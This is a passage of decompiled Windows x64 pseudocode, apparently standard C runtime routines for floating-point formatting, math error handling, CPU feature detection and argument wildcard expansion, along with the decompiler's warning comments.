    v10[2] = (__int64)"inf";
    v10[3] = (__int64)"inf";
    v10[8] = (__int64)"NAN(SNAN)";
    v10[10] = (__int64)"nan(snan)";
    v10[12] = (__int64)"NAN(IND)";
    v10[14] = (__int64)"nan(ind)";
    v10[9] = (__int64)"NAN";
    v10[13] = (__int64)"NAN";
    v10[6] = (__int64)"nan";
    v8 = 4i64 * (unsigned int)(a1 - 1);
    v10[7] = (__int64)"nan";
    v10[11] = (__int64)"nan";
    v10[15] = (__int64)"nan";
    v9 = -1i64;
    do
      ++v9;
    while ( *(_BYTE *)(v10[v8 + (a5 != 0 ? 0 : 2)] + v9) );
    result = sub_13F16DD4C(v6, a4, v10[v8 + (a5 != 0 ? 0 : 2) + (a4 <= v9)]);
    if ( (_DWORD)result )
    {
      sub_13F1682F0();
      JUMPOUT(0x13F170359i64);
    }
  }
  else
  {
    *a3 = 0;
    return 12i64;
  }
  return result;
}
// 13F170354: control flows out of bounds to 13F170359

//----- (000000013F17035C) ----------------------------------------------------
__int64 __fastcall sub_13F17035C(
        __int64 *a1,
        __m128i *a2,
        unsigned __int64 a3,
        _BYTE *a4,
        __int64 a5,
        int a6,
        int a7,
        unsigned __int64 a8,
        __int128 *a9)
{
  __int64 result; // rax
  bool v14; // r14
  int v15; // eax
  int v16; // edi
  __int64 v17; // rcx
  _BOOL8 v18; // rcx
  unsigned __int64 v19; // rdx
  __int64 v20[2]; // [rsp+50h] [rbp-38h] BYREF

  if ( !a2 || !a3 || !a4 || !a5 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 22i64;
  }
  v14 = a6 == 65 || (unsigned int)(a6 - 69) <= 2;
  if ( (a8 & 8) == 0 )
  {
    v15 = sub_13F16F924(a1);
    if ( v15 )
      return sub_13F170218(v15, *a1 < 0, a2, a3, v14);
  }
  v16 = (a8 >> 4) & 1 | 2;
  if ( a6 == 65 )
    return sub_13F16F98C(a1, a2, a3, a4, a5, a7, v14, v16, a9);
  if ( a6 == 69 )
    return sub_13F16FCEC(a1, a2, a3, a4, a5, a7, v14, v16, a9);
  if ( a6 != 70 )
  {
    if ( a6 == 71 )
      return sub_13F1700E0(a1, a2, a3, a4, a5, a7, v14, v16, a9);
    if ( a6 != 97 )
    {
      if ( a6 != 101 )
      {
        if ( a6 != 102 )
          return sub_13F1700E0(a1, a2, a3, a4, a5, a7, v14, v16, a9);
        goto LABEL_21;
      }
      return sub_13F16FCEC(a1, a2, a3, a4, a5, a7, v14, v16, a9);
    }
    return sub_13F16F98C(a1, a2, a3, a4, a5, a7, v14, v16, a9);
  }
LABEL_21:
  v17 = *a1;
  v20[0] = 0i64;
  v20[1] = 0i64;
  sub_13F175160(v17, a7, (__int64)v20, a4, a5);
  v18 = LODWORD(v20[0]) == 45;
  v19 = a3 - v18;
  if ( a3 == -1i64 )
    v19 = -1i64;
  result = sub_13F174BD0((__int64)a2->m128i_i64 + v18, v19, a7 + HIDWORD(v20[0]), (__int64)v20);
  if ( !(_DWORD)result )
    return sub_13F16FF98(a2, a3, a7, v20, 0, a9);
  a2->m128i_i8[0] = 0;
  return result;
}

//----- (000000013F1705A0) ----------------------------------------------------
__int64 __fastcall sub_13F1705A0(__int64 a1)
{
  if ( a1 )
    return *(unsigned int *)(a1 + 24);
  *(_DWORD *)sub_13F169DAC() = 22;
  sub_13F1682A0();
  return 0xFFFFFFFFi64;
}

//----- (000000013F1705C8) ----------------------------------------------------
__int64 sub_13F1705C8()
{
  return 0i64;
}

//----- (000000013F1705E0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F1705E0()
{
  __int64 v0; // rbx

  v0 = 0i64;
  while ( (unsigned int)sub_13F16EBCC((__int64)&qword_13F1C6830[5 * v0], 0xFA0u, 0) )
  {
    dword_13F1C6A38 = 14;
    v0 = (unsigned int)(v0 + 1);
    if ( (unsigned int)v0 >= 0xD )
      return 1;
  }
  sub_13F170644();
  return 0;
}
// 13F170608: write access to const memory at 13F1C6A38 has been detected
// 13F1C6830: using guessed type __int64 qword_13F1C6830[4];
// 13F1C6A38: using guessed type int dword_13F1C6A38;

//----- (000000013F170628) ----------------------------------------------------
void sub_13F170628()
{
  JUMPOUT(0x771DD7F0i64);
}
// 13F17063A: control flows out of bounds to 771DD7F0

//----- (000000013F170644) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F170644()
{
  int v0; // ebx

  v0 = 13;
  while ( v0 )
  {
    MEMORY[0x771B38F0](&qword_13F1C6830[5 * (unsigned int)--v0]);
    dword_13F1C6A38 = 12;
  }
  return 1;
}
// 13F170669: write access to const memory at 13F1C6A38 has been detected
// 13F1C6830: using guessed type __int64 qword_13F1C6830[4];
// 13F1C6A38: using guessed type int dword_13F1C6A38;

//----- (000000013F17067C) ----------------------------------------------------
void sub_13F17067C()
{
  JUMPOUT(0x771DD830i64);
}
// 13F17068E: control flows out of bounds to 771DD830

//----- (000000013F170698) ----------------------------------------------------
void sub_13F170698()
{
  JUMPOUT(0x771DD7F0i64);
}
// 13F17069F: control flows out of bounds to 771DD7F0

//----- (000000013F1706A8) ----------------------------------------------------
void sub_13F1706A8()
{
  JUMPOUT(0x771DD830i64);
}
// 13F1706AF: control flows out of bounds to 771DD830

//----- (000000013F1706B8) ----------------------------------------------------
__int64 __fastcall sub_13F1706B8(_DWORD *a1, _QWORD *a2, char a3, __int16 a4, _DWORD *a5, _DWORD *a6)
{
  return sub_13F1706E0(a1, a2, a3, a4, a5, a6, 0);
}

//----- (000000013F1706E0) ----------------------------------------------------
__int64 __fastcall sub_13F1706E0(_DWORD *a1, _QWORD *a2, char a3, __int16 a4, _DWORD *a5, _DWORD *a6, int a7)
{
  unsigned int v9; // edi
  char v10; // al
  __int64 v11; // rax
  _DWORD *v12; // rsi
  _DWORD *v13; // rcx
  __int64 result; // rax
  _DWORD *v15; // [rsp+30h] [rbp+10h] BYREF

  v15 = a1;
  v9 = -1073741811;
  a1[1] = 0;
  v15[2] = 0;
  v15[3] = 0;
  if ( (a3 & 0x10) != 0 )
  {
    v9 = -1073741681;
    v15[1] |= 1u;
  }
  if ( (a3 & 2) != 0 )
  {
    v9 = -1073741677;
    v15[1] |= 2u;
  }
  if ( (a3 & 1) != 0 )
  {
    v9 = -1073741679;
    v15[1] |= 4u;
  }
  if ( (a3 & 4) != 0 )
  {
    v9 = -1073741682;
    v15[1] |= 8u;
  }
  if ( (a3 & 8) != 0 )
  {
    v9 = -1073741680;
    v15[1] |= 0x10u;
  }
  v15[2] ^= (v15[2] ^ ~(16 * (*a2 >> 7))) & 0x10;
  v15[2] ^= (v15[2] ^ ~(8 * (*a2 >> 9))) & 8;
  v15[2] ^= (v15[2] ^ ~(4 * (*a2 >> 10))) & 4;
  v15[2] ^= (v15[2] ^ ~(2 * (*a2 >> 11))) & 2;
  v15[2] ^= (v15[2] ^ ~(*(_DWORD *)a2 >> 12)) & 1;
  v10 = sub_13F170B00();
  if ( (v10 & 1) != 0 )
    v15[3] |= 0x10u;
  if ( (v10 & 4) != 0 )
    v15[3] |= 8u;
  if ( (v10 & 8) != 0 )
    v15[3] |= 4u;
  if ( (v10 & 0x10) != 0 )
    v15[3] |= 2u;
  if ( (v10 & 0x20) != 0 )
    v15[3] |= 1u;
  v11 = *(_DWORD *)a2 & 0x6000i64;
  if ( v11 )
  {
    switch ( v11 )
    {
      case 8192i64:
        *v15 &= ~2u;
        *v15 |= 1u;
        break;
      case 16384i64:
        *v15 &= ~1u;
        *v15 |= 2u;
        break;
      case 24576i64:
        *v15 |= 3u;
        break;
    }
  }
  else
  {
    *v15 &= 0xFFFFFFFC;
  }
  *v15 &= 0xFFFE001F;
  *v15 |= 32 * (a4 & 0xFFF);
  v12 = a6;
  v15[8] |= 1u;
  if ( a7 )
  {
    v15[8] &= 0xFFFFFFE1;
    v15[4] = *a5;
    v15[24] |= 1u;
    v15[24] &= 0xFFFFFFE1;
    v15[20] = *v12;
  }
  else
  {
    v15[8] = v15[8] & 0xFFFFFFE1 | 2;
    *((_QWORD *)v15 + 2) = *(_QWORD *)a5;
    v15[24] |= 1u;
    v15[24] = v15[24] & 0xFFFFFFE1 | 2;
    *((_QWORD *)v15 + 10) = *(_QWORD *)v12;
  }
  sub_13F170A44();
  MEMORY[0x76F7C3C0](v9, 0i64, 1i64, &v15);
  v13 = v15;
  if ( (v15[2] & 0x10) != 0 )
    *a2 &= ~0x80ui64;
  if ( (v13[2] & 8) != 0 )
    *a2 &= ~0x200ui64;
  if ( (v13[2] & 4) != 0 )
    *a2 &= ~0x400ui64;
  if ( (v13[2] & 2) != 0 )
    *a2 &= ~0x800ui64;
  if ( (v13[2] & 1) != 0 )
    *a2 &= ~0x1000ui64;
  if ( (*v13 & 3) != 0 )
  {
    switch ( *v13 & 3 )
    {
      case 1:
        *a2 &= ~0x4000ui64;
        *a2 |= 0x2000ui64;
        break;
      case 2:
        *a2 &= ~0x2000ui64;
        *a2 |= 0x4000ui64;
        break;
      case 3:
        *a2 |= 0x6000ui64;
        break;
    }
  }
  else
  {
    *a2 &= 0xFFFFFFFFFFFF9FFFui64;
  }
  if ( a7 )
  {
    result = (unsigned int)v13[20];
    *v12 = result;
  }
  else
  {
    result = *((_QWORD *)v13 + 10);
    *(_QWORD *)v12 = result;
  }
  return result;
}

//----- (000000013F1709E8) ----------------------------------------------------
__int64 __fastcall sub_13F1709E8(_DWORD *a1, _QWORD *a2, char a3, __int16 a4, _DWORD *a5, _DWORD *a6)
{
  return sub_13F1706E0(a1, a2, a3, a4, a5, a6, 1);
}

//----- (000000013F170A14) ----------------------------------------------------
char *__fastcall sub_13F170A14(int a1)
{
  char *result; // rax

  if ( a1 == 1 )
  {
    result = sub_13F169DAC();
    *(_DWORD *)result = 33;
  }
  else
  {
    result = (char *)(unsigned int)(a1 - 2);
    if ( (unsigned int)result <= 1 )
    {
      result = sub_13F169DAC();
      *(_DWORD *)result = 34;
    }
  }
  return result;
}

//----- (000000013F170A44) ----------------------------------------------------
__int64 sub_13F170A44()
{
  unsigned int v0; // ebx

  v0 = sub_13F1765D0() & 0x3F;
  sub_13F1765EA();
  return v0;
}

//----- (000000013F170A64) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F170A64(int a1, int a2)
{
  unsigned int v4; // esi
  unsigned int v5; // ecx

  v4 = sub_13F1765D0();
  v5 = a2 & a1 | v4 & (~(_WORD)a2 | 0xFFFF807F);
  if ( (v5 & 0x40) != 0 )
    sub_13F1765E0(v5);
  else
    sub_13F1765E0(v5 & 0xFFFFFFBF);
  return v4;
}
// 13F170AAD: write access to const memory at 13F1B761C has been detected
// 13F1B761C: using guessed type char byte_13F1B761C;

//----- (000000013F170AE0) ----------------------------------------------------
void __fastcall sub_13F170AE0(char a1)
{
  int v2; // eax

  v2 = sub_13F1765D0();
  sub_13F1765E0(a1 & 0x3F | v2);
}

//----- (000000013F170B00) ----------------------------------------------------
__int64 sub_13F170B00()
{
  return sub_13F1765D0() & 0x3F;
}

//----- (000000013F170B14) ----------------------------------------------------
__int64 __fastcall sub_13F170B14(__int64 a1)
{
  if ( a1 )
    JUMPOUT(0x771B6460i64);
  *(_DWORD *)sub_13F169DAC() = 22;
  sub_13F1682A0();
  return -1i64;
}
// 13F170B46: control flows out of bounds to 771B6460
// 13F1C6A70: using guessed type __int64 qword_13F1C6A70;

//----- (000000013F170B50) ----------------------------------------------------
__int64 sub_13F170B50()
{
  __int64 v0; // rax
  wchar_t **v2; // [rsp+30h] [rbp+8h] BYREF

  v0 = sub_13F16E528();
  v2 = *(wchar_t ***)(v0 + 144);
  sub_13F16F8BC(v0, &v2);
  return (__int64)*v2;
}

//----- (000000013F170B80) ----------------------------------------------------
__int64 __fastcall sub_13F170B80(int a1, int a2, __int128 *a3)
{
  __int64 v4; // rdi
  unsigned int v5; // eax
  unsigned int v6; // er9
  __int64 result; // rax
  char v8; // [rsp+40h] [rbp-40h] BYREF
  char v9; // [rsp+41h] [rbp-3Fh]
  char v10; // [rsp+42h] [rbp-3Eh]
  __int64 v11; // [rsp+48h] [rbp-38h] BYREF
  __int128 v12; // [rsp+50h] [rbp-30h] BYREF
  char v13; // [rsp+60h] [rbp-20h]
  int v14; // [rsp+68h] [rbp-18h] BYREF
  __int16 v15; // [rsp+6Ch] [rbp-14h]

  v4 = a1;
  sub_13F1687CC((__int64)&v11, a3);
  if ( (unsigned int)(v4 + 1) <= 0x100 )
  {
    v5 = *(unsigned __int16 *)(*(_QWORD *)v12 + 2 * v4);
    goto LABEL_11;
  }
  if ( (unsigned int)sub_13F170C90(BYTE1(v4), &v12) )
  {
    v8 = BYTE1(v4);
    v6 = 2;
    v9 = v4;
    v10 = 0;
  }
  else
  {
    v8 = v4;
    v6 = 1;
    v9 = 0;
  }
  v14 = 0;
  v15 = 0;
  if ( (unsigned int)sub_13F173550(&v12, 1u, (__int64)&v8, v6, (__int64)&v14, *(_DWORD *)(v12 + 12), 1) )
  {
    v5 = (unsigned __int16)v14;
LABEL_11:
    result = a2 & v5;
    if ( v13 )
      *(_DWORD *)(v11 + 936) &= ~2u;
    return result;
  }
  if ( v13 )
    *(_DWORD *)(v11 + 936) &= ~2u;
  return 0i64;
}

//----- (000000013F170C90) ----------------------------------------------------
__int64 __fastcall sub_13F170C90(unsigned __int8 a1, __int128 *a2)
{
  __int64 result; // rax
  __int64 v4[3]; // [rsp+20h] [rbp-28h] BYREF
  char v5; // [rsp+38h] [rbp-10h]

  sub_13F1687CC((__int64)v4, a2);
  result = *(_WORD *)(*(_QWORD *)v4[1] + 2i64 * a1) & 0x8000;
  if ( v5 )
    *(_DWORD *)(v4[0] + 936) &= ~2u;
  return result;
}

//----- (000000013F170CD0) ----------------------------------------------------
__int64 __fastcall sub_13F170CD0(
        __int64 a1,
        __int64 a2,
        unsigned int a3,
        _BYTE *a4,
        int a5,
        __int64 a6,
        int a7,
        unsigned int a8,
        int a9)
{
  unsigned int v9; // ebx
  int v13; // eax
  unsigned int v14; // er14
  __int64 result; // rax
  unsigned int v16; // er12
  unsigned __int64 v17; // rdx
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // rcx
  __int64 v20; // rax
  void *v21; // rsp
  __int64 *v22; // rsi
  __int64 *v23; // rax
  __int64 v24; // r15
  int v25; // eax
  unsigned int v26; // edi
  unsigned __int64 v27; // rdx
  unsigned __int64 v28; // rax
  unsigned __int64 v29; // rcx
  __int64 v30; // rax
  void *v31; // rsp
  __int64 *v32; // rbx
  __int64 *v33; // rax
  _BYTE v34[32]; // [rsp+0h] [rbp-50h] BYREF
  __int64 v35; // [rsp+20h] [rbp-30h]
  int v36; // [rsp+28h] [rbp-28h]
  __int64 v37; // [rsp+30h] [rbp-20h]
  __int64 v38; // [rsp+38h] [rbp-18h]
  __int64 v39; // [rsp+50h] [rbp+0h] BYREF

  v9 = a5;
  v39 = a2;
  if ( a5 > 0 )
  {
    v13 = sub_13F176620(a4, a5);
    v9 = v13 + 1;
    if ( v13 >= a5 )
      v9 = v13;
  }
  v14 = a8;
  if ( !a8 )
    v14 = *(_DWORD *)(*(_QWORD *)a1 + 12i64);
  result = MEMORY[0x76F84FF0](v14, a9 != 0 ? 9 : 1, a4, v9, 0i64, 0);
  v16 = result;
  if ( (_DWORD)result )
  {
    v17 = 2i64 * (int)result;
    if ( (-(__int64)(v17 < v17 + 16) & (v17 + 16)) == 0 )
    {
      v22 = 0i64;
      goto LABEL_17;
    }
    v18 = v17 + 16;
    if ( ((v17 + 16) & -(__int64)(v17 < v17 + 16)) > 0x400 )
    {
      v23 = (__int64 *)sub_13F16F1F8(v18 & -(__int64)(v17 < v18));
      v22 = v23;
      if ( !v23 )
      {
LABEL_17:
        if ( v22 )
        {
          if ( (unsigned int)MEMORY[0x76F84FF0](v14, 1i64, a4, v9, v22, v16) )
          {
            v24 = v39;
            v25 = sub_13F16EC44(v39, a3, (__int64)v22, v16, 0i64, 0, 0i64, 0i64, 0i64);
            v26 = v25;
            if ( v25 )
            {
              if ( (a3 & 0x400) != 0 )
              {
                if ( !a7 )
                  goto LABEL_43;
                if ( v25 <= a7 )
                {
                  v26 = sub_13F16EC44(v24, a3, (__int64)v22, v16, a6, a7, 0i64, 0i64, 0i64);
                  if ( v26 )
                    goto LABEL_43;
                }
                goto LABEL_42;
              }
              v27 = 2i64 * v25;
              if ( (-(__int64)(v27 < v27 + 16) & (v27 + 16)) == 0 )
              {
                v32 = 0i64;
LABEL_35:
                if ( v32 )
                {
                  if ( (unsigned int)sub_13F16EC44(v24, a3, (__int64)v22, v16, (__int64)v32, v26, 0i64, 0i64, 0i64) )
                  {
                    v38 = 0i64;
                    v37 = 0i64;
                    if ( a7 )
                    {
                      v36 = a7;
                      v35 = a6;
                    }
                    else
                    {
                      v36 = 0;
                      v35 = 0i64;
                    }
                    v26 = MEMORY[0x76F91F80](v14, 0i64, v32, v26, v35, v36, v37, v38);
                    if ( v26 )
                    {
                      if ( *((_DWORD *)v32 - 4) == 56797 )
                        sub_13F16E734((__int64)(v32 - 2));
                      goto LABEL_43;
                    }
                  }
                  if ( *((_DWORD *)v32 - 4) == 56797 )
                    sub_13F16E734((__int64)(v32 - 2));
                }
                goto LABEL_42;
              }
              v28 = v27 + 16;
              if ( ((v27 + 16) & -(__int64)(v27 < v27 + 16)) > 0x400 )
              {
                v33 = (__int64 *)sub_13F16F1F8(v28 & -(__int64)(v27 < v28));
                v32 = v33;
                if ( !v33 )
                  goto LABEL_35;
                *(_DWORD *)v33 = 56797;
                goto LABEL_33;
              }
              v29 = v28 & -(__int64)(v27 < v28);
              v30 = v29 + 15;
              if ( v29 + 15 <= v29 )
                v30 = 0xFFFFFFFFFFFFFF0i64;
              v31 = alloca(v30 & 0xFFFFFFFFFFFFFFF0ui64);
              v32 = &v39;
              if ( v34 != (_BYTE *)-80i64 )
              {
                LODWORD(v39) = 52428;
LABEL_33:
                v32 += 2;
                goto LABEL_35;
              }
            }
          }
        }
LABEL_42:
        v26 = 0;
LABEL_43:
        if ( v22 )
        {
          if ( *((_DWORD *)v22 - 4) == 56797 )
            sub_13F16E734((__int64)(v22 - 2));
        }
        return v26;
      }
      *(_DWORD *)v23 = 56797;
    }
    else
    {
      v19 = v18 & -(__int64)(v17 < v18);
      v20 = v19 + 15;
      if ( v19 + 15 <= v19 )
        v20 = 0xFFFFFFFFFFFFFF0i64;
      v21 = alloca(v20 & 0xFFFFFFFFFFFFFFF0ui64);
      v22 = &v39;
      if ( v34 == (_BYTE *)-80i64 )
        goto LABEL_42;
      LODWORD(v39) = 52428;
    }
    v22 += 2;
    goto LABEL_17;
  }
  return result;
}

//----- (000000013F17102C) ----------------------------------------------------
__int64 __fastcall sub_13F17102C(
        __int128 *a1,
        __int64 a2,
        unsigned int a3,
        _BYTE *a4,
        int a5,
        __int64 a6,
        int a7,
        unsigned int a8,
        int a9)
{
  __int64 result; // rax
  __int64 v13; // [rsp+50h] [rbp-28h] BYREF
  char v14[24]; // [rsp+58h] [rbp-20h] BYREF

  sub_13F1687CC((__int64)&v13, a1);
  result = sub_13F170CD0((__int64)v14, a2, a3, a4, a5, a6, a7, a8, a9);
  if ( v14[16] )
    *(_DWORD *)(v13 + 936) &= ~2u;
  return result;
}

//----- (000000013F1710D0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F1710D0()
{
  int v0; // er8

  v0 = 0;
  dword_13F1C6A3C = 0;
  _RAX = 2i64;
  __asm { cpuid }
  if ( (_RCX & 0x18001000) == 402657280 )
  {
    __asm { xgetbv }
    v0 = 1;
    dword_13F1C6A3C = 1;
  }
  dword_13F1C6A40 = v0;
  return 0i64;
}
// 13F1710DB: write access to const memory at 13F1C6A3C has been detected
// 13F17112A: write access to const memory at 13F1C6A3C has been detected
// 13F171131: write access to const memory at 13F1C6A40 has been detected
// 13F1710D0: using guessed type __int64 __fastcall sub_13F1710D0();
// 13F1C6A3C: using guessed type int dword_13F1C6A3C;
// 13F1C6A40: using guessed type int dword_13F1C6A40;

//----- (000000013F171140) ----------------------------------------------------
__m128 __fastcall sub_13F171140(double a1, double a2, int a3)
{
  return sub_13F171180(a1, a2, a3, 27, (__int64)"log10");
}

//----- (000000013F171160) ----------------------------------------------------
__m128 __fastcall sub_13F171160(double a1, double a2, int a3)
{
  return sub_13F171180(a1, a2, a3, 26, (__int64)"log");
}

//----- (000000013F171180) ----------------------------------------------------
// local variable allocation has failed, the output may be wrong!
__m128 __fastcall sub_13F171180(double a1, double a2, int a3, __int16 a4, __int64 a5)
{
  int v6; // er8
  int v7; // er9
  char v9; // [rsp+20h] [rbp-48h]
  unsigned int v10; // [rsp+28h] [rbp-40h]
  double v11; // [rsp+30h] [rbp-38h]

  v6 = a3 - 1;
  if ( !v6 )
  {
    v7 = 2;
    v11 = a1;
    v10 = 34;
    v9 = 4;
    goto LABEL_5;
  }
  if ( v6 == 1 )
  {
    v7 = 1;
    v11 = a1;
    v10 = 33;
    v9 = 8;
LABEL_5:
    sub_13F17475C(a5, a4, *(__int64 *)&a2, v7, v9, v10, v11, 0i64, 1);
  }
  return *(__m128 *)&a2;
}
// 13F171180: inconsistent variable size for 'xmm1_8.8'

//----- (000000013F171220) ----------------------------------------------------
// local variable allocation has failed, the output may be wrong!
__m128 __fastcall sub_13F171220(double a1, double a2, double a3, unsigned int a4)
{
  __m128 result; // xmm0

  if ( a4 == 2 )
  {
    sub_13F17475C((__int64)"pow", 29, *(__int64 *)&a3, 2, 4, 0x22u, a1, *(__int64 *)&a2, 2);
  }
  else if ( a4 > 2 )
  {
    if ( a4 <= 5 )
    {
      *(double *)result.m128_u64 = sub_13F1749B8(*(__int64 *)&a3);
      return result;
    }
    if ( a4 == 6 )
    {
      sub_13F17475C((__int64)"pow", 29, *(__int64 *)&a3, 1, 8, 0x21u, a1, *(__int64 *)&a2, 2);
    }
    else if ( a4 <= 8 )
    {
      sub_13F17475C((__int64)"pow", 29, *(__int64 *)&a3, 4, 18, 0x22u, a1, *(__int64 *)&a2, 2);
    }
    else if ( a4 == 9 )
    {
      sub_13F17475C((__int64)"pow", 29, *(__int64 *)&a3, 3, 17, 0x22u, a1, *(__int64 *)&a2, 2);
    }
  }
  return *(__m128 *)&a3;
}
// 13F171250: conditional instruction was optimized away because er9.4>=7u
// 13F171220: inconsistent variable size for 'xmm2_8.8'

//----- (000000013F171344) ----------------------------------------------------
// local variable allocation has failed, the output may be wrong!
__m128 __fastcall sub_13F171344(float a1, float a2, double a3, unsigned int a4)
{
  int v4; // er9
  int v5; // er8
  __m128 result; // xmm0
  unsigned int v7; // [rsp+30h] [rbp-11h]
  float v8; // [rsp+38h] [rbp-9h]
  float v9; // [rsp+40h] [rbp-1h]

  if ( a4 == 1 )
  {
    v9 = a2;
    v8 = a1;
    v7 = 0;
    v4 = 0;
    v5 = LODWORD(a3);
LABEL_14:
    sub_13F174884((__int64)"powf", 29, v5, v4, 8, v7, v8, v9, 2);
    return *(__m128 *)&a3;
  }
  if ( a4 == 2 )
  {
    sub_13F174884((__int64)"powf", 29, SLODWORD(a3), 2, 4, 0x22u, a1, a2, 2);
  }
  else if ( a4 > 2 )
  {
    if ( a4 <= 5 )
    {
      result.m128_f32[0] = sub_13F1749D4(SLODWORD(a3));
      return result;
    }
    if ( a4 != 6 )
    {
      if ( a4 == 7 )
      {
        sub_13F174884((__int64)"powf", 29, SLODWORD(a3), 4, 18, 0x22u, a1, a2, 2);
      }
      else if ( a4 == 9 )
      {
        sub_13F174884((__int64)"powf", 29, SLODWORD(a3), 3, 17, 0x22u, a1, a2, 2);
      }
      return *(__m128 *)&a3;
    }
    v4 = 1;
    v9 = a2;
    v8 = a1;
    v5 = LODWORD(a3);
    v7 = 33;
    goto LABEL_14;
  }
  return *(__m128 *)&a3;
}
// 13F171344: inconsistent variable size for 'xmm2_8.8'

//----- (000000013F1714D0) ----------------------------------------------------
__int64 __fastcall sub_13F1714D0(unsigned __int64 a1, unsigned __int64 a2)
{
  if ( a1 >= a2 )
    return a1 > a2;
  else
    return 0xFFFFFFFFi64;
}

//----- (000000013F1714E4) ----------------------------------------------------
__int64 __fastcall sub_13F1714E4(unsigned __int64 *a1, __int64 *a2)
{
  __int64 v2; // rdi
  unsigned __int64 *v3; // rbx
  bool v5; // zf
  _BYTE *v6; // rcx
  _BYTE *v7; // rax
  unsigned __int64 v8; // rcx
  unsigned int v9; // eax
  unsigned int v10; // er14
  __int64 *v11; // r12
  unsigned __int64 v12; // rsi
  unsigned __int64 v13; // r9
  _QWORD *v14; // rdx
  __int64 v15; // r8
  __int64 v16; // r15
  unsigned __int64 v17; // rcx
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 v20; // rbx
  __int64 v21; // rdx
  __int64 *v22; // r15
  _BYTE *v23; // rax
  __int64 v24; // r8
  __int64 v25; // r13
  __int64 v26; // r13
  __int64 v27; // rax
  __int64 *v28; // r15
  unsigned __int64 v29; // rbx
  __int64 v30; // [rsp+38h] [rbp-28h]
  __int128 v31; // [rsp+40h] [rbp-20h] BYREF
  __int64 v32; // [rsp+50h] [rbp-10h]
  unsigned __int64 v34; // [rsp+B0h] [rbp+50h] BYREF
  _BYTE *i; // [rsp+B8h] [rbp+58h]

  v2 = 0i64;
  v3 = a1;
  if ( a2 )
  {
    *a2 = 0i64;
    v5 = *a1 == 0;
    v31 = 0i64;
    v32 = 0i64;
    while ( !v5 )
    {
      v6 = (_BYTE *)*v3;
      strcpy((char *)&v34, "*?");
      v7 = sub_13F176B18(v6, (unsigned __int8 *)&v34);
      v8 = *v3;
      if ( v7 )
        v9 = sub_13F171800(v8, v7, &v31);
      else
        v9 = sub_13F1716F0(v8, 0i64, 0i64, (__int64)&v31);
      v10 = v9;
      if ( v9 )
      {
        v11 = (__int64 *)*((_QWORD *)&v31 + 1);
        v12 = v31;
        goto LABEL_26;
      }
      v5 = *++v3 == 0;
    }
    v12 = v31;
    v13 = 0i64;
    v11 = (__int64 *)*((_QWORD *)&v31 + 1);
    v14 = (_QWORD *)v31;
    v34 = 0i64;
    v15 = 0i64;
    v16 = ((__int64)(*((_QWORD *)&v31 + 1) - v31) >> 3) + 1;
    v17 = (unsigned __int64)(*((_QWORD *)&v31 + 1) - v31 + 7) >> 3;
    if ( (unsigned __int64)v31 > *((_QWORD *)&v31 + 1) )
      v17 = 0i64;
    v10 = -1;
    if ( v17 )
    {
      do
      {
        v18 = -1i64;
        do
          ++v18;
        while ( *(_BYTE *)(*v14 + v18) );
        ++v14;
        v13 += v18 + 1;
        ++v15;
      }
      while ( v15 != v17 );
      v34 = v13;
    }
    v19 = sub_13F16C5EC(((__int64)(*((_QWORD *)&v31 + 1) - v31) >> 3) + 1, v13, 1ui64);
    v20 = v19;
    if ( v19 )
    {
      v21 = v19 + 8 * v16;
      v22 = (__int64 *)v12;
      v30 = v21;
      v23 = (_BYTE *)v21;
      for ( i = (_BYTE *)v21; v22 != v11; i = v23 )
      {
        v24 = *v22;
        v25 = -1i64;
        do
          ++v25;
        while ( *(_BYTE *)(v24 + v25) );
        v26 = v25 + 1;
        if ( (unsigned int)sub_13F176A44(v23, v34 + v21 - (_QWORD)v23, v24, v26) )
        {
          sub_13F1682F0();
          JUMPOUT(0x13F1716ECi64);
        }
        v27 = (__int64)i;
        v21 = v30;
        *(__int64 *)((char *)v22 + v20 - v12) = (__int64)i;
        v23 = (_BYTE *)(v26 + v27);
        ++v22;
      }
      v10 = 0;
      *a2 = v20;
    }
    sub_13F16E734(0i64);
LABEL_26:
    v28 = (__int64 *)v12;
    v29 = ((unsigned __int64)v11 - v12 + 7) >> 3;
    if ( v12 > (unsigned __int64)v11 )
      v29 = 0i64;
    if ( v29 )
    {
      do
      {
        sub_13F16E734(*v28);
        ++v2;
        ++v28;
      }
      while ( v2 != v29 );
    }
    sub_13F16E734(v12);
    return v10;
  }
  else
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 22i64;
  }
}
// 13F1716E7: control flows out of bounds to 13F1716EC

//----- (000000013F1716F0) ----------------------------------------------------
__int64 __fastcall sub_13F1716F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v5; // rdi
  unsigned __int64 v9; // rdi
  unsigned __int64 v11; // r14
  _BYTE *v12; // rax
  __int64 v13; // rbx
  unsigned int v14; // edi

  v5 = -1i64;
  do
    ++v5;
  while ( *(_BYTE *)(a1 + v5) );
  v9 = v5 + 1;
  if ( v9 > -1 - a3 )
    return 12i64;
  v11 = v9 + a3 + 1;
  v12 = (_BYTE *)sub_13F16E6BC(v11, 1ui64);
  v13 = (__int64)v12;
  if ( a3 && (unsigned int)sub_13F176A44(v12, v11, a2, a3) )
  {
    sub_13F1682F0();
    __debugbreak();
  }
  if ( (unsigned int)sub_13F176A44((_BYTE *)(v13 + a3), v11 - a3, a1, v9) )
  {
    sub_13F1682F0();
    __debugbreak();
  }
  v14 = sub_13F1719AC((__int64 *)a4);
  if ( v14 )
  {
    sub_13F16E734(v13);
  }
  else
  {
    **(_QWORD **)(a4 + 8) = v13;
    *(_QWORD *)(a4 + 8) += 8i64;
    v14 = 0;
  }
  sub_13F16E734(0i64);
  return v14;
}

//----- (000000013F171800) ----------------------------------------------------
__int64 __fastcall sub_13F171800(unsigned __int64 a1, _BYTE *a2, _QWORD *a3)
{
  __int64 i; // rbx
  unsigned __int8 v6; // al
  unsigned __int8 v8; // cl
  unsigned int v9; // edi
  char v10; // al
  __int64 v11; // r15
  __int64 v12; // rbx
  unsigned int v13; // eax
  __int64 v14; // rbp
  __int64 v15; // rdx
  char v16[44]; // [rsp+30h] [rbp-178h] BYREF
  char v17; // [rsp+5Ch] [rbp-14Ch] BYREF
